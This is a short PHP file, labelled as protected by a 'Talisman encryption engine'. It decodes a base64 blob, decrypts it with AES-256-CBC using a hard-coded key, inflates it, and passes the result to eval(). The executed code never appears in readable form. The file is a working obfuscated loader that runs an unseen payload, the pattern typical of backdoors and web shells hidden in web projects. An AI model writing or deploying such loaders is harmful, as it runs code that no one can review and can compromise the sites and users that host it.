<?php
/* PROTECTED BY TALISMAN ENCRYPTION ENGINE v2.0 */
$kab0ab = 'Talisman_Ultimate_WebSuite_2026_SecureKey!';
$p86a53 = base64_decode('pbykUPLBIu/MWZB5V7T1N0xUUUd0eGxVcWVJN2ZiMjg5c05MbnlMT3JLZm1KZGIvMWQyR2d6VU1wbWwyUW9McDI5TDAwK2xhdHhBZ1h0cGhBbnhHdU9aSkZOS3g2cm1kTWNmdHZvN1JqbWNjTHVxdDJ4VjZ5ZTNLZDdKSjRqRlFzMVVhbE1oaG03SmNkaWNwZ2hLWTc2SlNWZFNvZnVneTU1eXEveGxZcTRLbm1YSjZhYWpoWXB5Rm9sZzR1ZGtJQVRLVitxemhnb0hBTUZsMTRuWHN4VDhHY01hUDZrdFJqZlJVTThob096N1ZnYTc0U3Zld05GazExSTF2dm8yTVdaSytscXRFeHpORmVnU1doc3pobnB4bGhkT1hISjI4N01Pd2o1RnRERjZzdGJVa21Xald0RTUvdS84ZDhiY1UxSTNZVEVBYVJ6Um1FSmR5WmxKc3dHazBWY1ZZbjZmcXh1aW9IQT09');
$i284ff = openssl_cipher_iv_length('aes-256-cbc');
$v01f4e = substr($p86a53, 0, $i284ff);
$cf0144 = substr($p86a53, $i284ff);
eval('?>'.gzinflate(openssl_decrypt($cf0144, 'aes-256-cbc', $kab0ab, 0, $v01f4e)));